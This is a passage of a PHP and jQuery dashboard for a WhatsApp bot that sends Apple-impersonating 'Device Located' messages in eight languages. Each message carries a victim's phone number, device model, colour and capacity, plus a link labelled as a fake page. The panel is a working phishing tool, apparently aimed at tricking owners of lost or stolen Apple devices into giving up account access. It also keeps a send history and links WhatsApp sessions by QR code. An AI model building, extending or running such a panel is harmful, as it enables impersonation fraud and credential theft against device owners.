<?php
require_once 'config.php';
checkAuth();

// Fetch models
$stmtModels = $pdo->query("SELECT id, nome FROM modelos ORDER BY nome");
$modelos = $stmtModels->fetchAll(PDO::FETCH_ASSOC);

// Fetch colors
$stmtColors = $pdo->query("SELECT id, nome FROM cores ORDER BY nome");
$cores = $stmtColors->fetchAll(PDO::FETCH_ASSOC);

// Fetch Capacidades (GB/TB)
$stmtCaps = $pdo->query("SELECT id, nome FROM capacidades ORDER BY CAST(nome AS UNSIGNED) ASC, nome ASC");
$capacidades = $stmtCaps->fetchAll(PDO::FETCH_ASSOC);

// Fetch uploaded/saved images
$stmtImagens = $pdo->query("SELECT id, caminho FROM imagens_salvas ORDER BY caminho ASC");
$imagensSalvas = $stmtImagens->fetchAll(PDO::FETCH_ASSOC);

$defaultText = "*Dispositivo Localizado*\n> Dispositivo: *{modelo} {cor} {capacidade}*\n> Número de emergencia: *({numero})*\n> ID de caso: *000-A946*\nPara iniciar o processo de recuperação, digite *Ajuda*\n> *Copyright ©️ 2025 Apple Inc*\n> | Apple ID | Support | Privacy Policy";
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - Botzap</title>
    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <!-- FontAwesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body { background-color: #f8f9fa; }
        .navbar-brand { font-weight: bold; }
        .card { border: none; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); margin-bottom: 20px; }
        .card-header { background-color: #fff; border-bottom: 1px solid #edf2f9; font-weight: 600; padding: 1.25rem 1.5rem; border-radius: 12px 12px 0 0 !important; }
        .preview-box { background: #e9ecef; border-radius: 8px; padding: 15px; font-family: monospace; white-space: pre-wrap; margin-top: 10px; }
        #response-alert { display: none; }
    </style>
</head>
<body>

<nav class="navbar navbar-expand-lg navbar-dark bg-primary">
  <div class="container">
    <a class="navbar-brand" href="#"><i class="fas fa-robot me-2"></i>Botzap Panel</a>
    <div class="d-flex align-items-center">
        <!-- New Connect WhatsApp Button -->
        <a href="qr_status.php" class="btn btn-success btn-sm me-2">
            <i class="fab fa-whatsapp me-1"></i> Conectar Zap
        </a>

        <span class="navbar-text me-3">
          <i class="fas fa-user-circle me-1"></i> <?php echo htmlspecialchars($_SESSION['username']); ?>
        </span>
        <a href="logout.php" class="btn btn-outline-light btn-sm"><i class="fas fa-sign-out-alt"></i> Sair</a>
    </div>
  </div>
</nav>

<div class="container mt-4">
    <div class="row">
        
        <!-- Formulário de Envio -->
        <div class="col-lg-8">
            <div id="response-alert" class="alert" role="alert"></div>

            <div class="card">
                <div class="card-header"><i class="fas fa-paper-plane text-primary me-2"></i> Disparar Nova Mensagem</div>
                <div class="card-body">
                    <form id="sendForm" enctype="multipart/form-data">
                        
                        <div class="row mb-3">
                            <div class="col-md-4">
                                <label class="form-label fw-bold"><i class="fas fa-globe"></i> Idioma do Atendimento</label>
                                <select name="idioma" id="select-idioma" class="form-select" required>
                                    <option value="pt" selected>Português (Brasil)</option>
                                    <option value="en">Inglês (English)</option>
                                    <option value="es">Espanhol (Español)</option>
                                    <option value="zh">Mandarim (繁體/简体)</option>
                                    <option value="fr">Francês (Français)</option>
                                    <option value="ar">Árabe (العربية)</option>
                                    <option value="ru">Russo (Русский)</option>
                                    <option value="sv">Sueco (Svenska)</option>
                                </select>
                            </div>
                            <div class="col-md-4">
                                <label class="form-label fw-bold">Número do Cliente</label>
                                <div class="input-group">
                                    <span class="input-group-text"><i class="fab fa-whatsapp"></i></span>
                                    <input type="text" name="numero" class="form-control" placeholder="+5511999999999" required>
                                </div>
                            </div>
                            <div class="col-md-4">
                                <label class="form-label fw-bold">Link da Página Falsa</label>
                                <div class="input-group">
                                    <span class="input-group-text"><i class="fas fa-link"></i></span>
                                    <input type="url" name="link_rastreio" class="form-control" placeholder="https://..." required>
                                </div>
                            </div>
                        </div>

                        <div class="row mb-3">
                            <div class="col-md-4">
                                <label class="form-label fw-bold">Modelo</label>
                                <select name="modelo" id="select-modelo" class="form-select" required>
                                    <option value="">Selecione um modelo...</option>
                                    <?php foreach ($modelos as $img): ?>
                                        <option value="<?php echo htmlspecialchars($img['nome']); ?>"><?php echo htmlspecialchars($img['nome']); ?></option>
                                    <?php endforeach; ?>
                                </select>
                            </div>
                            <div class="col-md-4">
                                <label class="form-label fw-bold">Capacidade</label>
                                <select name="capacidade" id="select-capacidade" class="form-select" required>
                                    <option value="">Selecione os GB/TB...</option>
                                    <?php foreach ($capacidades as $cap): ?>
                                        <option value="<?php echo htmlspecialchars($cap['nome']); ?>"><?php echo htmlspecialchars($cap['nome']); ?></option>
                                    <?php endforeach; ?>
                                </select>
                            </div>
                            <div class="col-md-4">
                                <label class="form-label fw-bold">Cor</label>
                                <select name="cor" id="select-cor" class="form-select" required>
                                    <option value="">Selecione uma cor...</option>
                                    <?php foreach ($cores as $c): ?>
                                        <option value="<?php echo htmlspecialchars($c['nome']); ?>"><?php echo htmlspecialchars($c['nome']); ?></option>
                                    <?php endforeach; ?>
                                </select>
                            </div>
                        </div>

                        <hr>
                        
                        <div class="mb-3">
                            <label class="form-label fw-bold d-block">Origem da Imagem</label>
                            
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="radio" name="image_type" id="tipoURL" value="url" checked>
                                <label class="form-check-label" for="tipoURL">URL da Web</label>
                            </div>
                            
                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="radio" name="image_type" id="tipoUpload" value="upload">
                                <label class="form-check-label" for="tipoUpload">Upload do Arquivo</label>
                            </div>

                            <div class="form-check form-check-inline">
                                <input class="form-check-input" type="radio" name="image_type" id="tipoGallery" value="gallery">
                                <label class="form-check-label" for="tipoGallery">Galeria Salva</label>
                            </div>
                        </div>

                        <!-- URL Input -->
                        <div id="box-url" class="mb-3 p-3 bg-light rounded border">
                            <label class="form-label">Cole o Link da Imagem (.jpg/.png)</label>
                            <input type="url" name="image_url" class="form-control" placeholder="https://exemplo.com/imagem.png">
                        </div>

                        <!-- Upload Input -->
                        <div id="box-upload" class="mb-3 p-3 bg-light rounded border" style="display: none;">
                            <label class="form-label">Faça o upload do arquivo (Máx 5MB)</label>
                            <input type="file" name="image_file" class="form-control" accept="image/jpeg, image/png">
                            <small class="text-muted d-block mt-1">O arquivo será salvo automaticamente renomeado em /uploads/</small>
                        </div>

                        <!-- Gallery Input -->
                        <div id="box-gallery" class="mb-3 p-3 bg-light rounded border" style="display: none;">
                            <label class="form-label">Imagens já salvas no Servidor (/uploads/)</label>
                            <select name="image_gallery" class="form-select">
                                <option value="">Escolha uma imagem armazenada...</option>
                                <?php foreach ($imagensSalvas as $img): ?>
                                    <option value="<?php echo htmlspecialchars($img['caminho']); ?>">
                                        <?php echo htmlspecialchars(basename($img['caminho'])); ?>
                                    </option>
                                <?php endforeach; ?>
                            </select>
                        </div>

                        <hr>

                        <div class="mb-3">
                            <label class="form-label fw-bold">Texto Base (Legenda)</label>
                            <textarea name="texto_base" id="texto-base" rows="5" class="form-control" required><?php echo htmlspecialchars($defaultText); ?></textarea>
                            <small class="text-muted">Use as variáveis herdadas limitadas: <code>{modelo}</code>, <code>{capacidade}</code> e <code>{cor}</code></small>
                        </div>

                        <button type="submit" class="btn btn-primary btn-lg w-100" id="btn-submit">
                            <i class="fas fa-paper-plane me-2"></i> Enviar Mensagem via API
                        </button>

                    </form>
                </div>
            </div>
        </div>

        <!-- Sidebar / Preview -->
        <div class="col-lg-4">
            <div class="card mb-4">
                <div class="card-header"><i class="fas fa-eye text-success me-2"></i> Preview do Assunto</div>
                <div class="card-body">
                    <p class="mb-1 text-muted small">O texto será assim:</p>
                    <div class="preview-box">
                        <div id="preview-image-container" class="mb-3 text-center" style="display: none;">
                            <img id="preview-image" src="" alt="Pré-visualização da Imagem" class="img-fluid rounded border" style="max-height: 200px; object-fit: contain;">
                        </div>
                        <div id="preview-text">...</div>
                    </div>
                </div>
            </div>

            <!-- Dashboard Info -->
            <div class="card mb-4">
                <div class="card-header"><i class="fas fa-chart-line text-info me-2"></i> Resumo</div>
                <div class="card-body p-0">
                    <ul class="list-group list-group-flush rounded-bottom">
                        <li class="list-group-item d-flex justify-content-between align-items-center">
                            Modelos Disponíveis
                            <span class="badge bg-primary rounded-pill"><?php echo count($modelos); ?></span>
                        </li>
                        <li class="list-group-item d-flex justify-content-between align-items-center">
                            Cores Registradas
                            <span class="badge bg-primary rounded-pill"><?php echo count($cores); ?></span>
                        </li>
                        <li class="list-group-item d-flex justify-content-between align-items-center">
                            Status do Robô (API)
                            <span class="badge bg-success rounded-pill" id="badge-status-wpp">Online</span>
                        </li>
                    </ul>
                </div>
            </div>

            <!-- Últimos Envios -->
            <div class="card">
                <div class="card-header d-flex justify-content-between align-items-center">
                    <span><i class="fas fa-history text-secondary me-2"></i> Últimos Envios</span>
                    <button class="btn btn-outline-danger btn-sm" onclick="clearBotMemory()" title="Limpar toda a memória do Robô (Para de responder todos)">
                        <i class="fas fa-eraser"></i> Limpar Bot
                    </button>
                </div>
                <div class="card-body p-0">
                    <ul class="list-group list-group-flush rounded-bottom">
                        <?php 
                        $stmtHist = $pdo->query("SELECT id, numero, modelo, cor, data_hora, status FROM mensagens_enviadas ORDER BY id DESC LIMIT 5");
                        $history = $stmtHist->fetchAll(PDO::FETCH_ASSOC);
                        
                        if (empty($history)) {
                            echo '<li class="list-group-item text-muted text-center py-3">Nenhum envio registrado.</li>';
                        } else {
                            foreach ($history as $h) {
                                $dt = date('H:i', strtotime($h['data_hora']));
                                $isPaused = ($h['status'] === 'pausado');
                                $bgClass = $isPaused ? 'bg-light text-muted' : '';
                                $pauseBtn = $isPaused ? 
                                    "<button class='btn btn-sm btn-success p-1 py-0' onclick='togglePause({$h['id']}, \"{$h['numero']}\", \"ativo\")' title='Retomar Robô'><i class='fas fa-play'></i></button>" : 
                                    "<button class='btn btn-sm btn-warning p-1 py-0' onclick='togglePause({$h['id']}, \"{$h['numero']}\", \"pausado\")' title='Pausar Robô'><i class='fas fa-pause'></i></button>";
                                
                                echo "<li class='list-group-item px-3 py-2 {$bgClass}'>
                                        <div class='d-flex justify-content-between align-items-center'>
                                            <div class='d-flex align-items-center'>
                                                <strong class='me-2'>{$h['numero']}</strong>
                                                " . ($isPaused ? "<span class='badge bg-warning text-dark' style='font-size: 0.6rem;'>PAUSADO</span>" : "") . "
                                            </div>
                                            <div class='d-flex gap-1'>
                                                {$pauseBtn}
                                                <button class='btn btn-sm btn-danger p-1 py-0' onclick='deleteOrder({$h['id']}, \"{$h['numero']}\")' title='Excluir Ordem'><i class='fas fa-trash-alt'></i></button>
                                                <small class='text-muted ms-1'>$dt</small>
                                            </div>
                                        </div>
                                        <div class='small text-secondary'>{$h['modelo']} - {$h['cor']}</div>
                                      </li>";
                            }
                        }
                        ?>
                    </ul>
                </div>
            </div>

        </div> <!-- Fecha col-lg-4 -->
    </div> <!-- Fecha row -->
</div> <!-- Fecha container -->

<!-- WhatsApp Connection Modal -->
<div class="modal fade" id="whatsappModal" tabindex="-1" aria-labelledby="whatsappModalLabel" aria-hidden="true">
  <div class="modal-dialog modal-dialog-centered">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title text-success fw-bold" id="whatsappModalLabel"><i class="fab fa-whatsapp me-2"></i> Conectar WhatsApp</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <div class="modal-body text-center py-4">
        
        <div id="qr-container">
            <h6 class="mb-3">Aguardando geração do QR Code...</h6>
            <!-- Placeholder for QR Code / API integration -->
            <div class="p-4 d-inline-block rounded mb-3" style="background: #f8f9fa; border: 2px dashed #dee2e6;">
                <i class="fas fa-qrcode fa-5x text-secondary opacity-50"></i>
            </div>
            <p class="small text-muted mb-0">Abra o WhatsApp no seu celular, vá em Aparelhos Conectados e aponte a câmera para ler o código acima quando estiver disponível.</p>
        </div>

        <div id="connected-container" style="display: none;">
            <i class="fas fa-check-circle fa-4x text-success mb-3 shadow-sm rounded-circle"></i>
            <h5 class="text-success fw-bold">WhatsApp Conectado!</h5>
            <p class="text-muted small">Sua sessão está ativa e pronta para disparos.</p>
            <button class="btn btn-outline-danger mt-3 px-4 rounded-pill" onclick="logoutWhatsApp()"><i class="fas fa-sign-out-alt me-2"></i> Desconectar Sessão</button>
        </div>

      </div>
      <div class="modal-footer justify-content-center">
        <button type="button" class="btn btn-outline-secondary px-4 rounded-pill" onclick="logoutWhatsApp(); this.innerHTML='<i class=\'fas fa-spinner fa-spin\'></i> Reiniciando...'">
            <i class="fas fa-sync-alt me-2"></i> Gerar Novo QR Code
        </button>
      </div>
    </div>
  </div>
</div>
<!-- /WhatsApp Modal -->

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
$(document).ready(function() {
    
    // Mapeamento Inteligente: Capacidades por Aparelho
    const mapModelCapacities = {
        "iPhone (original)": ["4 GB", "8 GB", "16 GB", "32 GB"],
        "iPhone 3G": ["8 GB", "16 GB", "32 GB"],
        "iPhone 3GS": ["8 GB", "16 GB", "32 GB"],
        "iPhone 4": ["8 GB", "16 GB", "32 GB", "64 GB"],
        "iPhone 4S": ["8 GB", "16 GB", "32 GB", "64 GB"],
        "iPhone 5": ["8 GB", "16 GB", "32 GB", "64 GB"],
        "iPhone 5C": ["8 GB", "16 GB", "32 GB", "64 GB"],
        "iPhone 5S": ["8 GB", "16 GB", "32 GB", "64 GB"],
        "iPhone SE (1ª Geração)": ["16 GB", "32 GB", "64 GB", "128 GB"],
        "iPhone 6": ["16 GB", "32 GB", "64 GB", "128 GB"],
        "iPhone 6 Plus": ["16 GB", "32 GB", "64 GB", "128 GB"],
        "iPhone 6s": ["16 GB", "32 GB", "64 GB", "128 GB"],
        "iPhone 6s Plus": ["16 GB", "32 GB", "64 GB", "128 GB"],
        "iPhone 7": ["32 GB", "128 GB", "256 GB"],
        "iPhone 7 Plus": ["32 GB", "128 GB", "256 GB"],
        "iPhone 8": ["64 GB", "128 GB", "256 GB"],
        "iPhone 8 Plus": ["64 GB", "128 GB", "256 GB"],
        "iPhone X": ["64 GB", "128 GB", "256 GB"],
        "iPhone XR": ["64 GB", "128 GB", "256 GB"],
        "iPhone XS": ["64 GB", "256 GB", "512 GB"],
        "iPhone XS Max": ["64 GB", "256 GB", "512 GB"],
        "iPhone 11": ["64 GB", "128 GB", "256 GB"],
        "iPhone 11 Pro": ["64 GB", "256 GB", "512 GB"],
        "iPhone 11 Pro Max": ["64 GB", "256 GB", "512 GB"],
        "iPhone SE (2ª Geração)": ["64 GB", "128 GB", "256 GB"],
        "iPhone 12": ["64 GB", "128 GB", "256 GB"],
        "iPhone 12 mini": ["64 GB", "128 GB", "256 GB"],
        "iPhone 12 Pro": ["128 GB", "256 GB", "512 GB"],
        "iPhone 12 Pro Max": ["128 GB", "256 GB", "512 GB"],
        "iPhone 13": ["128 GB", "256 GB", "512 GB"],
        "iPhone 13 mini": ["128 GB", "256 GB", "512 GB"],
        "iPhone 13 Pro": ["128 GB", "256 GB", "512 GB", "1 TB"],
        "iPhone 13 Pro Max": ["128 GB", "256 GB", "512 GB", "1 TB"],
        "iPhone 14": ["128 GB", "256 GB", "512 GB"],
        "iPhone 14 Plus": ["128 GB", "256 GB", "512 GB"],
        "iPhone 14 Pro": ["128 GB", "256 GB", "512 GB", "1 TB"],
        "iPhone 14 Pro Max": ["128 GB", "256 GB", "512 GB", "1 TB"],
        "iPhone 15": ["128 GB", "256 GB", "512 GB"],
        "iPhone 15 Plus": ["128 GB", "256 GB", "512 GB"],
        "iPhone 15 Pro": ["128 GB", "256 GB", "512 GB", "1 TB"],
        "iPhone 15 Pro Max": ["128 GB", "256 GB", "512 GB", "1 TB"],
        "iPhone 16": ["128 GB", "256 GB", "512 GB", "1 TB"],
        "iPhone 16 Plus": ["128 GB", "256 GB", "512 GB", "1 TB"],
        "iPhone 16 Pro": ["128 GB", "256 GB", "512 GB", "1 TB"],
        "iPhone 16 Pro Max": ["128 GB", "256 GB", "512 GB", "1 TB"],
        "iPhone 17": ["128 GB", "256 GB", "512 GB", "1 TB"],
        "iPhone 17 Pro": ["128 GB", "256 GB", "512 GB", "1 TB"],
        "iPhone 17 Pro Max": ["128 GB", "256 GB", "512 GB", "1 TB"],
        "iPad (básico)": ["16 GB", "32 GB", "64 GB", "128 GB", "256 GB", "512 GB", "1 TB"],
        "iPad mini": ["16 GB", "32 GB", "64 GB", "128 GB", "256 GB", "512 GB"],
        "iPad Air": ["16 GB", "32 GB", "64 GB", "128 GB", "256 GB", "512 GB", "1 TB"],
        "iPad Pro 11\"": ["64 GB", "128 GB", "256 GB", "512 GB", "1 TB", "2 TB"],
        "iPad Pro 12.9\"": ["64 GB", "128 GB", "256 GB", "512 GB", "1 TB", "2 TB"],
        "MacBook (12\")": ["256 GB", "512 GB", "1 TB"],
        "MacBook Air": ["256 GB", "512 GB", "1 TB", "2 TB"],
        "MacBook Pro 13\"": ["256 GB", "512 GB", "1 TB", "2 TB"],
        "MacBook Pro 14\"": ["512 GB", "1 TB", "2 TB", "4 TB", "8 TB"],
        "MacBook Pro 16\"": ["512 GB", "1 TB", "2 TB", "4 TB", "8 TB"],
        "Apple TV HD": ["32 GB"],
        "Apple TV 4K": ["32 GB", "64 GB"],
        "Apple TV 4K (2ª Ger ou novo)": ["64 GB", "128 GB"]
    };

    const mapModelColors = {
        "iPhone (original)": ["Preto", "Branco"],
        "iPhone 3G": ["Preto", "Branco"],
        "iPhone 3GS": ["Preto", "Branco"],
        "iPhone 4": ["Preto", "Branco"],
        "iPhone 4S": ["Preto", "Branco"],
        "iPhone 5": ["Preto", "Branco", "Prata"],
        "iPhone 5C": ["Azul", "Verde", "Rosa", "Amarelo", "Branco"],
        "iPhone 5S": ["Cinza Espacial", "Prata", "Ouro"],
        "iPhone SE (1ª Geração)": ["Cinza Espacial", "Prata", "Ouro", "Ouro Rosa"],
        "iPhone 6": ["Cinza Espacial", "Prata", "Ouro"],
        "iPhone 6 Plus": ["Cinza Espacial", "Prata", "Ouro"],
        "iPhone 6s": ["Cinza Espacial", "Prata", "Ouro", "Ouro Rosa"],
        "iPhone 6s Plus": ["Cinza Espacial", "Prata", "Ouro", "Ouro Rosa"],
        "iPhone 7": ["Preto", "Preto Brilhante", "Prata", "Ouro", "Ouro Rosa", "Vermelho (Product RED)"],
        "iPhone 7 Plus": ["Preto", "Preto Brilhante", "Prata", "Ouro", "Ouro Rosa", "Vermelho (Product RED)"],
        "iPhone 8": ["Cinza Espacial", "Prata", "Ouro", "Vermelho (Product RED)"],
        "iPhone 8 Plus": ["Cinza Espacial", "Prata", "Ouro", "Vermelho (Product RED)"],
        "iPhone X": ["Cinza Espacial", "Prata"],
        "iPhone XR": ["Preto", "Branco", "Azul", "Amarelo", "Coral", "Vermelho (Product RED)"],
        "iPhone XS": ["Cinza Espacial", "Prata", "Ouro"],
        "iPhone XS Max": ["Cinza Espacial", "Prata", "Ouro"],
        "iPhone 11": ["Preto", "Verde", "Amarelo", "Roxo", "Vermelho (Product RED)", "Branco"],
        "iPhone 11 Pro": ["Cinza Espacial", "Prata", "Ouro", "Verde Meia-Noite"],
        "iPhone 11 Pro Max": ["Cinza Espacial", "Prata", "Ouro", "Verde Meia-Noite"],
        "iPhone SE (2ª Geração)": ["Preto", "Branco", "Vermelho (Product RED)"],
        "iPhone 12": ["Preto", "Branco", "Vermelho (Product RED)", "Verde", "Azul", "Roxo"],
        "iPhone 12 mini": ["Preto", "Branco", "Vermelho (Product RED)", "Verde", "Azul", "Roxo"],
        "iPhone 12 Pro": ["Grafite", "Prata", "Ouro", "Azul Pacífico"],
        "iPhone 12 Pro Max": ["Grafite", "Prata", "Ouro", "Azul Pacífico"],
        "iPhone 13": ["Estelar", "Meia-Noite", "Azul", "Rosa", "Verde", "Vermelho (Product RED)"],
        "iPhone 13 mini": ["Estelar", "Meia-Noite", "Azul", "Rosa", "Verde", "Vermelho (Product RED)"],
        "iPhone 13 Pro": ["Grafite", "Ouro", "Prata", "Azul Sierra", "Verde Alpino"],
        "iPhone 13 Pro Max": ["Grafite", "Ouro", "Prata", "Azul Sierra", "Verde Alpino"],
        "iPhone 14": ["Meia-Noite", "Roxo", "Estelar", "Azul", "Vermelho (Product RED)", "Amarelo"],
        "iPhone 14 Plus": ["Meia-Noite", "Roxo", "Estelar", "Azul", "Vermelho (Product RED)", "Amarelo"],
        "iPhone 14 Pro": ["Preto Espacial", "Prata", "Ouro", "Roxo Profundo"],
        "iPhone 14 Pro Max": ["Preto Espacial", "Prata", "Ouro", "Roxo Profundo"],
        "iPhone 15": ["Rosa", "Amarelo", "Verde", "Azul", "Preto"],
        "iPhone 15 Plus": ["Rosa", "Amarelo", "Verde", "Azul", "Preto"],
        "iPhone 15 Pro": ["Titânio Natural", "Titânio Azul", "Titânio Branco", "Titânio Preto"],
        "iPhone 15 Pro Max": ["Titânio Natural", "Titânio Azul", "Titânio Branco", "Titânio Preto"],
        "iPhone 16": ["Ultramarine", "Teal", "Rosa", "Branco", "Preto"],
        "iPhone 16 Plus": ["Ultramarine", "Teal", "Rosa", "Branco", "Preto"],
        "iPhone 16 Pro": ["Titânio Preto", "Titânio Branco", "Titânio Natural", "Titânio Deserto"],
        "iPhone 16 Pro Max": ["Titânio Preto", "Titânio Branco", "Titânio Natural", "Titânio Deserto"],
        "iPhone 17": ["Ultramarine", "Teal", "Rosa", "Branco", "Preto"],
        "iPhone 17 Pro": ["Titânio Preto", "Titânio Branco", "Titânio Natural", "Titânio Deserto"],
        "iPhone 17 Pro Max": ["Titânio Preto", "Titânio Branco", "Titânio Natural", "Titânio Deserto"],
        "iPad (básico)": ["Prata", "Azul", "Rosa", "Amarelo"],
        "iPad mini": ["Cinza Espacial", "Rosa", "Roxo", "Estelar"],
        "iPad Air": ["Cinza Espacial", "Estelar", "Rosa", "Roxo", "Azul"],
        "iPad Pro 11\"": ["Prata", "Cinza Espacial"],
        "iPad Pro 12.9\"": ["Prata", "Cinza Espacial"],
        "MacBook (12\")": ["Ouro", "Prata", "Cinza Espacial", "Ouro Rosa"],
        "MacBook Air": ["Prata", "Estelar", "Cinza Espacial", "Meia-Noite"],
        "MacBook Pro 13\"": ["Prata", "Cinza Espacial"],
        "MacBook Pro 14\"": ["Prata", "Cinza Espacial", "Preto Espacial"],
        "MacBook Pro 16\"": ["Prata", "Cinza Espacial", "Preto Espacial"],
        "Apple TV HD": ["Preto"],
        "Apple TV 4K": ["Preto"],
        "Apple TV 4K (2ª Ger ou novo)": ["Preto"]
    };

    // Dinâmica do Select Modelo -> Capacidade e Cor
    $('#select-modelo').change(function() {
        let modelo = $(this).val();
        let capSelect = $('#select-capacidade');
        let corSelect = $('#select-cor');
        
        // Salvar a atual se possivel
        let currentCap = capSelect.val();
        let currentCor = corSelect.val();

        capSelect.empty().append('<option value="">Selecione os GB/TB...</option>');
        corSelect.empty().append('<option value="">Selecione uma cor...</option>');
        
        if (modelo) {
            if (mapModelCapacities[modelo]) {
                let suportadas = mapModelCapacities[modelo];
                $.each(suportadas, function(index, value) {
                    capSelect.append($('<option></option>').attr('value', value).text(value));
                });
                if (suportadas.includes(currentCap)) capSelect.val(currentCap);
            }

            if (mapModelColors[modelo]) {
                let coresSuportadas = mapModelColors[modelo];
                $.each(coresSuportadas, function(index, value) {
                    corSelect.append($('<option></option>').attr('value', value).text(value));
                });
                if (coresSuportadas.includes(currentCor)) corSelect.val(currentCor);
            }
        }
        updatePreview();
    });

    // Mapeamento de Textos Base por Idioma (Dashboard)
    const baseTexts = {
        "pt": "*Dispositivo Localizado*\n> Dispositivo: *{modelo} {cor} {capacidade}*\n> Número de emergencia: *({numero})*\n> ID de caso: *000-A946*\nPara iniciar o processo de recuperação, digite *Ajuda*\n> *Copyright ©️ 2025 Apple Inc*\n> | Apple ID | Support | Privacy Policy",
        "en": "*Device Located*\n> Device: *{modelo} {cor} {capacidade}*\n> Emergency Number: *({numero})*\n> Case ID: *000-A946*\nTo start the recovery process, type *Help*\n> *Copyright ©️ 2025 Apple Inc*\n> | Apple ID | Support | Privacy Policy",
        "es": "*Dispositivo Localizado*\n> Dispositivo: *{modelo} {cor} {capacidade}*\n> Número de emergencia: *({numero})*\n> ID de caso: *000-A946*\nPara iniciar el processo de recuperação, escriba *Ayuda*\n> *Copyright ©️ 2025 Apple Inc*\n> | Apple ID | Support | Privacy Policy",
        "zh": "*设备已定位*\n> 设备：*{modelo} {cor} {capacidade}*\n> 紧急号码：*({numero})*\n> 案例 ID：*000-A946*\n要开始恢复流程，请输入 *帮助*\n> *Copyright ©️ 2025 Apple Inc*\n> | Apple ID | Support | Privacy Policy",
        "fr": "*Appareil Localisé*\n> Appareil : *{modelo} {cor} {capacidade}*\n> Numéro d'urgence : *({numero})*\n> ID de dossier : *000-A946*\nPour commencer le processus de récupération, tapez *Aide*\n> *Copyright ©️ 2025 Apple Inc*\n> | Apple ID | Support | Privacy Policy",
        "ar": "*تم تحديد موقع الجهاز*\n> الجهاز: *{modelo} {cor} {capacidade}*\n> رقم الطوارئ: *({numero})*\n> رقم الحالة: *000-A946*\nلبدء عملية الاستعادة، اكتب *مساعدة*\n> *Copyright ©️ 2025 Apple Inc*\n> | Apple ID | Support | Privacy Policy",
        "ru": "*Устройство обнаружено*\n> Устройство: *{modelo} {cor} {capacidade}*\n> Номер экстренной связи: *({numero})*\n> Номер обращения: *000-A946*\nЧтобы начать процесс восстановления, введите *Помощь*\n> *Copyright ©️ 2025 Apple Inc*\n> | Apple ID | Support | Privacy Policy",
        "sv": "*Enhet hittad*\n> Enhet: *{modelo} {cor} {capacidade}*\n> Nödnummer: *({numero})*\n> Ärende-ID: *000-A946*\nFör att påbörja återställningen, skriv *Hjälp*\n> *Copyright ©️ 2025 Apple Inc*\n> | Apple ID | Support | Privacy Policy"
    };

    // Alterar o textarea do texto base quando mudar o idioma
    $('#select-idioma').change(function() {
        const lang = $(this).val();
        if(baseTexts[lang]) {
            $('#texto-base').val(baseTexts[lang]);
            updatePreview();
        }
    });

    // Image Preview Function
    function updateImagePreview(src) {
        if (src && src.trim() !== '') {
            $('#preview-image').attr('src', src);
            $('#preview-image-container').show();
        } else {
            $('#preview-image-container').hide();
            $('#preview-image').attr('src', '');
        }
    }

    // Toggle Image Input Types
    $('input[name="image_type"]').change(function() {
        $('#box-url, #box-upload, #box-gallery').hide();
        updateImagePreview(''); // Limpa a imagem atual ao trocar de tipo
        
        if (this.value === 'url') {
            $('#box-url').show();
            updateImagePreview($('input[name="image_url"]').val());
        } else if (this.value === 'upload') {
            $('#box-upload').show();
            let fileInput = $('input[name="image_file"]')[0];
            if (fileInput.files && fileInput.files[0]) {
                let reader = new FileReader();
                reader.onload = function(e) { updateImagePreview(e.target.result); }
                reader.readAsDataURL(fileInput.files[0]);
            }
        } else if (this.value === 'gallery') {
            $('#box-gallery').show();
            updateImagePreview($('select[name="image_gallery"]').val());
        }
    });

    // Listeners para trocar a imagem dependendo do input ativo
    $('input[name="image_url"]').on('input', function() {
        if ($('input[name="image_type"]:checked').val() === 'url') {
            updateImagePreview($(this).val());
        }
    });

    $('select[name="image_gallery"]').on('change', function() {
        if ($('input[name="image_type"]:checked').val() === 'gallery') {
            updateImagePreview($(this).val());
        }
    });

    $('input[name="image_file"]').on('change', function() {
        if ($('input[name="image_type"]:checked').val() === 'upload') {
            if (this.files && this.files[0]) {
                let reader = new FileReader();
                reader.onload = function(e) {
                    updateImagePreview(e.target.result);
                }
                reader.readAsDataURL(this.files[0]);
            } else {
                updateImagePreview('');
            }
        }
    });

    // Real-time Preview Text Replacement
    function updatePreview() {
        let text = $('#texto-base').val() || '';
        let modelo = $('#select-modelo').val() || '{modelo}';
        let cor = $('#select-cor').val() || '{cor}';
        let capacidade = $('#select-capacidade').val() || '{capacidade}';
        
        let replaced = text.replace(/{modelo}/g, modelo)
                           .replace(/{cor}/g, cor)
                           .replace(/{capacidade}/g, capacidade);
                           
        $('#preview-text').text(replaced);
    }

    // Trigger para todas as alterações
    $('#texto-base, #select-modelo, #select-cor, #select-capacidade, input[name="image_type"]').on('input change', updatePreview);
    updatePreview(); // initial Trigger

    // AJAX Form Submit
    $('#sendForm').on('submit', function(e) {
        e.preventDefault();
        
        let formData = new FormData(this);
        let btn = $('#btn-submit');
        let originalHtml = btn.html();
        
        btn.html('<i class="fas fa-spinner fa-spin me-2"></i> Processando API...').prop('disabled', true);
        $('#response-alert').hide();

        $.ajax({
            url: 'api/send_media.php',
            type: 'POST',
            data: formData,
            contentType: false,
            processData: false,
            success: function(response) {
                try {
                    let res = JSON.parse(response);
                    if (res.status === 'success') {
                        $('#response-alert')
                            .removeClass('alert-danger')
                            .addClass('alert-success')
                            .html('<i class="fas fa-check-circle me-2"></i> ' + res.message)
                            .show();
                        
                        $('input[type="file"], input[type="url"]').val('');
                        setTimeout(() => location.reload(), 2000);
                    } else {
                        $('#response-alert')
                            .removeClass('alert-success')
                            .addClass('alert-danger')
                            .html('<i class="fas fa-exclamation-triangle me-2"></i> Erro: ' + res.message)
                            .show();
                    }
                } catch(e) {
                    $('#response-alert')
                        .removeClass('alert-success')
                        .addClass('alert-danger')
                        .text('Erro na resposta do servidor. Você rodou o Bot no terminal Node.js?')
                        .show();
                }
            },
            error: function() {
                $('#response-alert')
                    .removeClass('alert-success')
                    .addClass('alert-danger')
